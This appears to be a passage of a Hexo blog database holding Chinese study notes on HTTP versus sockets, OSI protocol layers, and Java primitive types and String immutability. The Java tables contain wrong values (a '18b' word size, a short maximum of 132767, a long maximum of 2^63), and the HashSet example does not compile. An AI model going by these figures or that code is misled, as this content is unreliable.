title=\"5.总结\"></a>5.总结</h4><ul>\n<li>1.Http是应用层协议，Socket是对Tcp/Ip的封装</li>\n<li>2.Http发送数据也会经过Socket(Tcp或者Udp建立的连接)</li>\n<li>3.数据的传输和接收，是通过Socket,但是得到数据，是按照其包装和解包装的协议来的，Socket只是单纯的传输数据(bit)，并不关心数据是什么，有什么意义。</li>\n<li>4.Socket传输时，发送字符串，接收时也能直接接收到字符串，是因为包装/解包装层级一样，得到了发送时的数据。</li>\n</ul>\n<h4 id=\"6-各协议所对应层次-2019-09-23\"><a href=\"#6-各协议所对应层次-2019-09-23\" class=\"headerlink\" title=\"6.各协议所对应层次 2019/09/23\"></a>6.各协议所对应层次 2019/09/23</h4><table>\n<thead>\n<tr>\n<th>层级</th>\n<th>协议</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>应用层</td>\n<td>DHCP · DNS · FTP · Gopher · HTTP · IMAP4 · IRC · NNTP · XMPP · POP3 · SIP · SMTP ·SNMP · SSH · TELNET · RPC · RTCP · RTP ·RTSP · SDP · SOAP · GTP · STUN · NTP · SSDP</td>\n</tr>\n<tr>\n<td>表示层</td>\n<td>HTTP/HTML · FTP · Telnet · ASN.1（具有表示层功能）</td>\n</tr>\n<tr>\n<td>会话层</td>\n<td>ADSP·ASP·H.245·ISO-SP·iSNS·NetBIOS·PAP·RPC·RTCP·SMPP·SCP·SSH·ZIP·SDP（具有会话层功能）</td>\n</tr>\n<tr>\n<td>传输层</td>\n<td>TCP · UDP · TLS · DCCP · SCTP ·RSVP · PPTP</td>\n</tr>\n<tr>\n<td>网络层</td>\n<td>IP (IPv4 · IPv6) · ICMP · ICMPv6 · IGMP ·IS-IS · IPsec · BGP · RIP · OSPF ·ARP · RARP</td>\n</tr>\n<tr>\n<td>数据链路层</td>\n<td>Wi-Fi(IEEE 802.11) · WiMAX(IEEE 802.16) ·ATM · DTM · 令牌环 · 以太网路 ·FDDI · 帧中继 · GPRS · EVDO · HSPA · HDLC · PPP · L2TP · ISDN ·STP</td>\n</tr>\n<tr>\n<td>物理层</td>\n<td>以太网路卡 · 调制解调器 · 电力线通信(PLC) · SONET/SDH（光同步数字传输网） ·G.709（光传输网络） · 光导纤维 · 同轴电缆 · 双绞线</td>\n</tr>\n</tbody>\n</table>\n<p>注意: 应用层，表示层，会话层可以不用那个严格区分，都可以当作应用层协议来看待</p>\n"},{"title":"一次完整的http请求","date":"2019-09-17T20:38:47.000Z","_content":"","source":"_posts/base/httpandsocket/http了解.md","raw":"---\ntitle: 一次完整的http请求\ndate: 2019-09-17 16:38:47\ntags: [protocol]\n---\n","slug":"base/httpandsocket/http了解","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lf00406dcpxsm9glgn","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"java数据类型","date":"2019-06-17T15:26:34.000Z","_content":"\n## 一.8种基本数据类型\n\n### 1.大小\n\n- 位 bit(b)  \n- 字节 Byte(B) = 8b\n- 字  = 18b\n\n|  类型  |    大小    |    范围  |\n| :--:   |   :--:    | :--:     |\n|boolean |1位        | ture/false(0/1)|\n|byte    | 8位/1字节  | -128--127 |\n|short   |16位/2字节  |-32768--132767|\n|char    |16位/2字节  |\\u0000--\\uffff(一个16unicode字符)|\n|int     |32位/4字节  |-2^31--2^31-1|\n|float   |32位/4字节  | |\n|long    |64位/8字节  |-2^63--2^63|\n|double  |64位/8字节  | |\n\n### 2.转换\n\n- 转换顺序从低级到高级\n\nbyte,short,char—> int —> long—> float —> double\n\n- 将大容量强转为小容量，会损失精度\n\n```\nint i = 128;\n(byte) i; // -128\n```\n- 浮点数转为整数，舍弃小数部分\n\n```\nfloat f = 12.55f;\n(int)f; // 12\n```\n\n### 3.包装类型\n\n基本数据类型：byte，int， short， long, boolean，char, float，double等<br>\n\n包装类型： Byte，Integer，Short，Long，Boolean，Character，Float,Double等<br>\n\n- 为什么要有包装类 ?\n\nJava语言是一个面向对象的语言,但Java中的基本数据类型却是不面向对象的。例如:集合类中只能存放对象List\\<Integer\\>, 不能存放基本类型数据List\\<int\\>。\n\n- 怎么用 ?\n\n\n基本类型与其包装类之间转换:\n```\n/** 将int类型转换为Integer类型*/\nint intNum = 10;\nInteger integer = new Integer(intNum);\n/** 将Integer类型转换为int类型*/\nint intValue = integer.intValue();\n```\n实际上Jdk有自动装包/拆包机制，不需要我们手动进行转换.\n```\n/** int类型会自动转换为Integer类型*/\nint n = 12;\nInteger m = n;\n```\n\n## 二.引用数据类型\n\n- 引用数据类型包括: 类/接口和数组.<br>\n\n如 String s = \"123\"; 类型为 java.lang.String 类<br>\n\n- 引用类型的默认值为null\n\n## 三.其它\n\n### 1.关于String不可变\n\n- 理解String中的变与不变\n\n```\nString s = \"123\";\nSystem.out.println(System.identityHashCode(s)); //1650967483\ns += \"456\";\nSystem.out.println(System.identityHashCode(s)); //87285178\n```\nString为不可变，所以创建后 s = \"123\",就不再变化。<br>\n那我们为什么能重新给它赋值呢? 实际上是，新建了一个String，s指向了新的地址引用<br>.\n\n- 为什么不可变 ?\n\nString 类为 public <front color=#CB4335 >final</front> class String{}<br>\n可见，String类被定义成了final，所以String不可变.<br>\n\n- 为什么要不可变 ?\n\n1.用于Hash<br>\n\n因为String的hash值(用来标明不同对象)经常被用到,例如Map的key，不可变的特性使hash值也可保持不变，不用每次都计算hash值.<br>\n\n2.用于线程安全<br>\n\n因为String不可变，天生具备线程安全,无论多少个线程操作，都不会改变其值。<br>\n\n3.用于String pool<br>\n\nJVM （heap中）维护着一个String pool(字符串常量池),保存着所有字符串字面量.<br>\n如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。<br>\n\n当一个字符串调用 intern() 方法时，如果 String Pool 中已经存在一个字符串和该字符串值相等（使用 equals() 方法进行确定），那么就会返回 String Pool 中字符串的引用；否则，就会在 String Pool 中添加一个新的字符串，并返回这个新字符串的引用。<br>\n\n下面示例中，s1 和 s2 采用 new String() 的方式新建了两个不同字符串，而 s3 和 s4 是通过 s1.intern() 方法取得一个字符串引用。intern() 首先把 s1 引用的字符串放到 String Pool 中，然后返回这个字符串引用。因此 s3 和 s4 引用的是同一个字符串。<br>\n```\nString s1 = new String(\"aaa\");\nString s2 = new String(\"aaa\");\nSystem.out.println(s1 == s2);           // false\nString s3 = s1.intern();\nString s4 = s1.intern();\nSystem.out.println(s3 == s4);           // true;  \n```\n如果是采用 \"bbb\" 这种字面量的形式创建字符串，会自动地将字符串放入 String Pool 中。<br>\n```\nString s5 = \"bbb\";//不存在，创建\nString s6 = \"bbb\";//已存在，获得引用\nSystem.out.println(s5 == s6);  // true\n```\n\n4.方便其它对象使用<br>\n\n如一个Set中存着String类型的值，要保证Set中的值不可变。如下，按照原则，Set中的值应该不可变，如果a的值改变了，明显违反了规则。\n```\nHashSet<String> set = new HashSet<String>();\nset.add(new String(\"a\"));\nset.add(new String(\"b\"));\nset.add(new String(\"c\"));\n\nfor(String a: set)\n\ta.value = \"a\";\n```\n","source":"_posts/java/base/java基本数据类型.md","raw":"---\ntitle: java数据类型\ndate: 2019-06-17 11:26:34\ntags: [java]\n---\n\n## 一.8种基本数据类型\n\n### 1.大小\n\n- 位 bit(b)  \n- 字节 Byte(B) = 8b\n- 字  = 18b\n\n|  类型  |    大小    |    范围  |\n| :--:   |   :--:    | :--:     |\n|boolean |1位        | ture/false(0/1)|\n|byte    | 8位/1字节  | -128--127 |\n|short   |16位/2字节  |-32768--132767|\n|char    |16位/2字节  |\\u0000--\\uffff(一个16unicode字符)|\n|int     |32位/4字节  |-2^31--2^31-1|\n|float   |32位/4字节  | |\n|long    |64位/8字节  |-2^63--2^63|\n|double  |64位/8字节  | |\n\n### 2.转换\n\n- 转换顺序从低级到高级\n\nbyte,short,char—> int —> long—> float —> double\n\n- 将大容量强转为小容量，会损失精度\n\n```\nint i = 128;\n(byte) i; // -128\n```\n- 浮点数转为整数，舍弃小数部分\n\n```\nfloat f = 12.55f;\n(int)f; // 12\n```\n\n### 3.包装类型\n\n基本数据类型：byte，int， short， long, boolean，char, float，double等<br>\n\n包装类型： Byte，Integer，Short，Long，Boolean，Character，Float,Double等<br>\n\n- 为什么要有包装类 ?\n\nJava语言是一个面向对象的语言,但Java中的基本数据类型却是不面向对象的。例如:集合类中只能存放对象List\\<Integer\\>, 不能存放基本类型数据List\\<int\\>。\n\n- 怎么用 ?\n\n\n基本类型与其包装类之间转换:\n```\n/** 将int类型转换为Integer类型*/\nint intNum = 10;\nInteger integer = new Integer(intNum);\n/** 将Integer类型转换为int类型*/\nint intValue = integer.intValue();\n```\n实际上Jdk有自动装包/拆包机制，不需要我们手动进行转换.\n```\n/** int类型会自动转换为Integer类型*/\nint n = 12;\nInteger m = n;\n```\n\n## 二.引用数据类型\n\n- 引用数据类型包括: 类/接口和数组.<br>\n\n如 String s = \"123\"; 类型为 java.lang.String 类<br>\n\n- 引用类型的默认值为null\n\n## 三.其它\n\n### 1.关于String不可变\n\n- 理解String中的变与不变\n\n```\nString s = \"123\";\nSystem.out.println(System.identityHashCode(s)); //1650967483\ns += \"456\";\nSystem.out.println(System.identityHashCode(s)); //87285178\n```\nString为不可变，所以创建后 s = \"123\",就不再变化。<br>\n那我们为什么能重新给它赋值呢? 实际上是，新建了一个String，s指向了新的地址引用<br>.\n\n- 为什么不可变 ?\n\nString 类为 public <front color=#CB4335 >final</front> class String{}<br>\n可见，String类被定义成了final，所以String不可变.<br>\n\n- 为什么要不可变 ?\n\n1.用于Hash<br>\n\n因为String的hash值(用来标明不同对象)经常被用到,例如Map的key，不可变的特性使hash值也可保持不变，不用每次都计算hash值.<br>\n\n2.用于线程安全<br>\n\n因为String不可变，天生具备线程安全,无论多少个线程操作，都不会改变其值。<br>\n\n3.用于String pool<br>\n\nJVM （heap中）维护着一个String pool(字符串常量池),保存着所有字符串字面量.<br>\n如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。<br>\n\n当一个字符串调用 intern() 方法时，如果 String Pool 中已经存在一个字符串和该字符串值相等（使用 equals() 方法进行确定），那么就会返回 String Pool 中字符串的引用；否则，就会在 String Pool 中添加一个新的字符串，并返回这个新字符串的引用。<br>\n\n下面示例中，s1 和 s2 采用 new String() 的方式新建了两个不同字符串，而 s3 和 s4 是通过 s1.intern() 方法取得一个字符串引用。intern() 首先把 s1 引用的字符串放到 String Pool 中，然后返回这个字符串引用。因此 s3 和 s4 引用的是同一个字符串。<br>\n```\nString s1 = new String(\"aaa\");\nString s2 = new String(\"aaa\");\nSystem.out.println(s1 == s2);           // false\nString s3 = s1.intern();\nString s4 = s1.intern();\nSystem.out.println(s3 == s4);           // true;  \n```\n如果是采用 \"bbb\" 这种字面量的形式创建字符串，会自动地将字符串放入 String Pool 中。<br>\n```\nString s5 = \"bbb\";//不存在，创建\nString s6 = \"bbb\";//已存在，获得引用\nSystem.out.println(s5 == s6);  // true\n```\n\n4.方便其它对象使用<br>\n\n如一个Set中存着String类型的值，要保证Set中的值不可变。如下，按照原则，Set中的值应该不可变，如果a的值改变了，明显违反了规则。\n```\nHashSet<String> set = new HashSet<String>();\nset.add(new String(\"a\"));\nset.add(new String(\"b\"));\nset.add(new String(\"c\"));\n\nfor(String a: set)\n\ta.value = \"a\";\n```\n","slug":"java/base/java基本数据类型","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lg00426dcp3pnr00el","content":"<h2 id=\"一-8种基本数据类型\"><a href=\"#一-8种基本数据类型\" class=\"headerlink\" title=\"一.8种基本数据类型\"></a>一.8种基本数据类型</h2><h3 id=\"1-大小\"><a href=\"#1-大小\" class=\"headerlink\" title=\"1.大小\"></a>1.大小</h3><ul>\n<li>位 bit(b)  </li>\n<li>字节 Byte(B) = 8b</li>\n<li>字  = 18b</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">类型</th>\n<th style=\"text-align:center\">大小</th>\n<th style=\"text-align:center\">范围</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">boolean</td>\n<td style=\"text-align:center\">1位</td>\n<td style=\"text-align:center\">ture/false(0/1)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">byte</td>\n<td style=\"text-align:center\">8位/1字节</td>\n<td style=\"text-align:center\">-128–127</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">short</td>\n<td style=\"text-align:center\">16位/2字节</td>\n<td style=\"text-align:center\">-32768–132767</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">char</td>\n<td style=\"text-align:center\">16位/2字节</td>\n<td style=\"text-align:center\">\\u0000–\\uffff(一个16unicode字符)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">int</td>\n<td style=\"text-align:center\">32位/4字节</td>\n<td style=\"text-align:center\">-2^31–2^31-1</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">float</td>\n<td style=\"text-align:center\">32位/4字节</td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">long</td>\n<td style=\"text-align:center\">64位/8字节</td>\n<td style=\"text-align:center\">-2^63–2^63</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">double</td>\n<td style=\"text-align:center\">64位/8字节</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"2-转换\"><a href=\"#2-转换\" class=\"headerlink\" title=\"2.转换\"></a>2.转换</h3><ul>\n<li>转换顺序从低级到高级</li>\n</ul>\n<p>byte,short,char—&gt; int —&gt; long—&gt; float —&gt; double</p>\n<ul>\n<li>将大容量强转为小容量，会损失精度</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int i = 128;</span><br><span class=\"line\">(byte) i; // -128</span><br></pre></td></tr></table></figure>\n<ul>\n<li>浮点数转为整数，舍弃小数部分</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">float f = 12.55f;</span><br><span class=\"line\">(int)f; // 12</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-包装类型\"><a href=\"#3-包装类型\" class=\"headerlink\" title=\"3.包装类型\"></a>3.包装类型</h3><p>基本数据类型：byte，int， short， long, boolean，char, float，double等<br></p>\n<p>包装类型： Byte，Integer，Short，Long，Boolean，Character，Float,Double等<br></p>\n<ul>\n<li>为什么要有包装类 ?</li>\n</ul>\n<p>Java语言是一个面向对象的语言,但Java中的基本数据类型却是不面向对象的。例如:集合类中只能存放对象List\\&lt;Integer>, 不能存放基本类型数据List\\&lt;int>。</p>\n<ul>\n<li>怎么用 ?</li>\n</ul>\n<p>基本类型与其包装类之间转换:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** 将int类型转换为Integer类型*/</span><br><span class=\"line\">int intNum = 10;</span><br><span class=\"line\">Integer integer = new Integer(intNum);</span><br><span class=\"line\">/** 将Integer类型转换为int类型*/</span><br><span class=\"line\">int intValue = integer.intValue();</span><br></pre></td></tr></table></figure></p>\n<p>实际上Jdk有自动装包/拆包机制，不需要我们手动进行转换.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** int类型会自动转换为Integer类型*/</span><br><span class=\"line\">int n = 12;</span><br><span class=\"line\">Integer m = n;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"二-引用数据类型\"><a href=\"#二-引用数据类型\" class=\"headerlink\" title=\"二.引用数据类型\"></a>二.引用数据类型</h2><ul>\n<li>引用数据类型包括: 类/接口和数组.<br></li>\n</ul>\n<p>如 String s = “123”; 类型为 java.lang.String 类<br></p>\n<ul>\n<li>引用类型的默认值为null</li>\n</ul>\n<h2 id=\"三-其它\"><a href=\"#三-其它\" class=\"headerlink\" title=\"三.其它\"></a>三.其它</h2><h3 id=\"1-关于String不可变\"><a href=\"#1-关于String不可变\" class=\"headerlink\" title=\"1.关于String不可变\"></a>1.关于String不可变</h3><ul>\n<li>理解String中的变与不变</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String s = &quot;123&quot;;</span><br><span class=\"line\">System.out.println(System.identityHashCode(s)); //1650967483</span><br><span class=\"line\">s += &quot;456&quot;;</span><br><span class=\"line\">System.out.println(System.identityHashCode(s)); //87285178</span><br></pre></td></tr></table></figure>\n<p>String为不可变，所以创建后 s = “123”,就不再变化。<br><br>那我们为什么能重新给它赋值呢? 实际上是，新建了一个String，s指向了新的地址引用<br>.</p>\n<ul>\n<li>为什么不可变 ?</li>\n</ul>\n<p>String 类为 public <front color=\"#CB4335\">final</front> class String{}<br><br>可见，String类被定义成了final，所以String不可变.<br></p>\n<ul>\n<li>为什么要不可变 ?</li>\n</ul>\n<p>1.用于Hash<br></p>\n<p>因为String的hash值(用来标明不同对象)经常被用到,例如Map的key，不可变的特性使hash值也可保持不变，不用每次都计算hash值.<br></p>\n<p>2.用于线程安全<br></p>\n<p>因为String不可变，天生具备线程安全,无论多少个线程操作，都不会改变其值。<br></p>\n<p>3.用于String pool<br></p>\n<p>JVM （heap中）维护着一个String pool(字符串常量池),保存着所有字符串字面量.<br><br>如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。<br></p>\n<p>当一个字符串调用 intern() 方法时，如果 String Pool 中已经存在一个字符串和该字符串值相等（使用 equals() 方法进行确定），那么就会返回 String Pool 中字符串的引用；否则，就会在 String Pool 中添加一个新的字符串，并返回这个新字符串的引用。<br></p>\n<p>下面示例中，s1 和 s2 采用 new String() 的方式新建了两个不同字符串，而 s3 和 s4 是通过 s1.intern() 方法取得一个字符串引用。intern() 首先把 s1 引用的字符串放到 String Pool 中，然后返回这个字符串引用。因此 s3 和 s4 引用的是同一个字符串。<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String s1 = new String(&quot;aaa&quot;);</span><br><span class=\"line\">String s2 = new String(&quot;aaa&quot;);</span><br><span class=\"line\">System.out.println(s1 == s2);           // false</span><br><span class=\"line\">String s3 = s1.intern();</span><br><span class=\"line\">String s4 = s1.intern();</span><br><span class=\"line\">System.out.println(s3 == s4);           // true;</span><br></pre></td></tr></table></figure></p>\n<p>如果是采用 “bbb” 这种字面量的形式创建字符串，会自动地将字符串放入 String Pool 中。<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String s5 = &quot;bbb&quot;;//不存在，创建</span><br><span class=\"line\">String s6 = &quot;bbb&quot;;//已存在，获得引用</span><br><span class=\"line\">System.out.println(s5 == s6);  // true</span><br></pre></td></tr></table></figure></p>\n<p>4.方便其它对象使用<br></p>\n<p>如一个Set中存着String类型的值，要保证Set中的值不可变。如下，按照原则，Set中的值应该不可变，如果a的值改变了，明显违反了规则。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HashSet&lt;String&gt; set = new HashSet&lt;String&gt;();</span><br><span class=\"line\">set.add(new String(&quot;a&quot;));</span><br><span class=\"line\">set.add(new String(&quot;b&quot;));</span><br><span class=\"line\">set.add(new String(&quot;c&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">for(String a: set)</span><br><span class=\"line\">\ta.value = &quot;a&quot;;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一-8种基本数据类型\"><a href=\"#一-8种基本数据类型\" class=\"headerlink\" title=\"一.8种基本数据类型\"></a>一.8种基本数据类型</h2><h3 id=\"1-大小\"><a href=\"#1-大小\" class=\"headerlink\" title=\"1.大小\"></a>1.大小</h3><ul>\n<li>位 bit(b)  </li>\n<li>字节 Byte(B) = 8b</li>\n<li>字  = 18b</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">类型</th>\n<th style=\"text-align:center\">大小</th>\n<th style=\"text-align:center\">范围</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">boolean</td>\n<td style=\"text-align:center\">1位</td>\n<td style=\"text-align:center\">ture/false(0/1)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">byte</td>\n<td style=\"text-align:center\">8位/1字节</td>\n<td style=\"text-align:center\">-128–127</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">short</td>\n<td style=\"text-align:center\">16位/2字节</td>\n<td style=\"text-align:center\">-32768–132767</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">char</td>\n<td style=\"text-align:center\">16位/2字节</td>\n<td style=\"text-align:center\">\\u0000–\\uffff(一个16unicode字符)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">int</td>\n<td style=\"text-align:center\">32位/4字节</td>\n<td style=\"text-align:center\">-2^31–2^31-1</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">float</td>\n<td style=\"text-align:center\">32位/4字节</td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">long</td>\n<td style=\"text-align:center\">64位/8字节</td>\n<td style=\"text-align:center\">-2^63–2^63</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">double</td>\n<td style=\"text-align:center\">64位/8字节</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"2-转换\"><a href=\"#2-转换\" class=\"headerlink\" title=\"2.转换\"></a>2.转换</h3><ul>\n<li>转换顺序从低级到高级</li>\n</ul>\n<p>byte,short,char—&gt; int —&gt; long—&gt; float —&gt; double</p>\n<ul>\n<li>将大容量强转为小容量，会损失精度</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int i = 128;</span><br><span class=\"line\">(byte) i; // -128</span><br></pre></td></tr></table></figure>\n<ul>\n<li>浮点数转为整数，舍弃小数部分</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">float f = 12.55f;</span><br><span class=\"line\">(int)f; // 12</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-包装类型\"><a href=\"#3-包装类型\" class=\"headerlink\" title=\"3.包装类型\"></a>3.包装类型</h3><p>基本数据类型：byte，int， short， long, boolean，char, float，double等<br></p>\n<p>包装类型： Byte，Integer，Short，Long，Boolean，Character，Float,Double等<br></p>\n<ul>\n<li>为什么要有包装类 ?</li>\n</ul>\n<p>Java语言是一个面向对象的语言,但Java中的基本数据类型却是不面向对象的。例如:集合类中只能存放对象List\\&lt;Integer>, 不能存放基本类型数据List\\&lt;int>。</p>\n<ul>\n<li>怎么用 ?</li>\n</ul>\n<p>基本类型与其包装类之间转换:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** 将int类型转换为Integer类型*/</span><br><span class=\"line\">int intNum = 10;</span><br><span class=\"line\">Integer integer = new Integer(intNum);</span><br><span class=\"line\">/** 将Integer类型转换为int类型*/</span><br><span class=\"line\">int intValue = integer.intValue();</span><br></pre></td></tr></table></figure></p>\n<p>实际上Jdk有自动装包/拆包机制，不需要我们手动进行转换.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** int类型会自动转换为Integer类型*/</span><br><span class=\"line\">int n = 12;</span><br><span class=\"line\">Integer m = n;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"二-引用数据类型\"><a href=\"#二-引用数据类型\" class=\"headerlink\" title=\"二.引用数据类型\"></a>二.引用数据类型</h2><ul>\n<li>引用数据类型包括: 类/接口和数组.<br></li>\n</ul>\n<p>如 String s = “123”; 类型为 java.lang.String 类<br></p>\n<ul>\n<li>引用类型的默认值为null</li>\n</ul>\n<h2 id=\"三-其它\"><a href=\"#三-其它\" class=\"headerlink\" title=\"三.其它\"></a>三.其它</h2><h3 id=\"1-关于String不可变\"><a href=\"#1-关于String不可变\" class=\"headerlink\" title=\"1.关于String不可变\"></a>1.关于String不可变</h3><ul>\n<li>理解String中的变与不变</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String s = &quot;123&quot;;</span><br><span class=\"line\">System.out.println(System.identityHashCode(s)); //1650967483</span><br><span class=\"line\">s += &quot;456&quot;;</span><br><span class=\"line\">System.out.println(System.identityHashCode(s)); //87285178</span><br></pre></td></tr></table></figure>\n<p>String为不可变，所以创建后 s = “123”,就不再变化。<br><br>那我们为什么能重新给它赋值呢? 实际上是，新建了一个String，s指向了新的地址引用<br>.</p>\n<ul>\n<li>为什么不可变 ?</li>\n</ul>\n<p>String 类为 public <front color=\"#CB4335\">final</front> class String{}<br><br>可见，String类被定义成了final，所以String不可变.<br></p>\n<ul>\n<li>为什么要不可变 ?</li>\n</ul>\n<p>1.用于Hash<br></p>\n<p>因为String的hash值(用来标明不同对象)经常被用到,例如Map的key，不可变的特性使hash值也可保持不变，不用每次都计算hash值.<br></p>\n<p>2.用于线程安全<br></p>\n<p>因为String不可变，天生具备线程安全,无论多少个线程操作，都不会改变其值。<br></p>\n<p>3.用于String pool<br></p>\n<p>JVM （heap中）维护着一个String pool(字符串常量池),保存着所有字符串字面量.<br><br>如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。<br></p>\n<p>当一个字符串调用 intern() 方法时，如果 String Pool 中已经存在一个字符串和该字符串值相等（使用 equals() 方法进行确定），那么就会返回 String Pool 中字符串的引用；否则，就会在 String Pool 中添加一个新的字符串，并返回这个新字符串的引用。<br></p>\n<p>下面示例中，s1 和 s2 采用 new String() 的方式新建了两个不同字符串，而 s3 和 s4 是通过 s1.intern() 方法取得一个字符串引用。intern() 首先把 s1 引用的字符串放到 String Pool 中，然后返回这个字符串引用。因此 s3 和 s4 引用的是同一个字符串。<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String s1 = new String(&quot;aaa&quot;);</span><br><span class=\"line\">String s2 = new String(&quot;aaa&quot;);</span><br><span class=\"line\">System.out.println(s1 == s2);           // false</span><br><span class=\"line\">String s3 = s1.intern();</span><br><span class=\"line\">String s4 = s1.intern();</span><br><span class=\"line\">System.out.println(s3 == s4);           // true;</span><br></pre></td></tr></table></figure></p>\n<p>如果是采用 “bbb” 这种字面量的形式创建字符串，会自动地将字符串放入 String Pool 中。<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String s5 = &quot;bbb&quot;;//不存在，创建</span><br><span class=\"line\">String s6 = &quot;bbb&quot;;//已存在，获得引用</span><br><span class=\"line\">System.out.println(s5 == s6);  // true</span><br></pre></td></tr></table></figure></p>\n<p>4.方便其它对象使用<br></p>\n<p>如一个Set中存着String类型的值，要保证Set中的值不可变。如下，按照原则，Set中的值应该不可变，如果a的值改变了，明显违反了规则。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HashSet&lt;String&gt; set = new HashSet&lt;String&gt;();</span><br><span class=\"line\">set.add(new String(&quot;a&quot;));</span><br><span class=\"line\">set.add(new String(&quot;b&quot;));</span><br><span class=\"line\">set.add(new String(&quot;c&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">for(String a: set)</span><br><span class=\"line\">\ta.value = &quot;a&quot;;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"java访问权限","date":"2019-06-17T15:26:34.000Z","_content":"\n### 